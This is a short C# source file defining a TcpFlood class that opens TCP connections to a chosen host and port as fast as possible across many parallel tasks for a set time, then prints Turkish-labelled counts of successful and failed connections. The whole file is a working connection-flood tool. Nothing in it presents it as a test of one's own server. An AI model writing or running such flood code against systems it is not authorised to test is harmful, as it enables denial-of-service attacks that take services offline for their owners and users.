using System;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

public class TcpFlood
{
    public static async Task Run(string host, int port, int durationSeconds, int parallelism)
    {
        var cts = new CancellationTokenSource();
        cts.CancelAfter(TimeSpan.FromSeconds(durationSeconds));
        int total = 0, success = 0, fail = 0;

        List<Task> tasks = new List<Task>();
        for (int i = 0; i < parallelism; i++)
        {
            tasks.Add(Task.Run(async () =>
            {
                while (!cts.IsCancellationRequested)
                {
                    try
                    {
                        using var client = new TcpClient();
                        await client.ConnectAsync(host, port);
                        Interlocked.Increment(ref total);
                        Interlocked.Increment(ref success);
                    }
                    catch
                    {
                        Interlocked.Increment(ref fail);
                    }
                }
            }));
        }

        await Task.WhenAll(tasks);

        Console.WriteLine($"[TCP] Toplam: {total}, Başarılı: {success}, Hatalı: {fail}");
    }
} 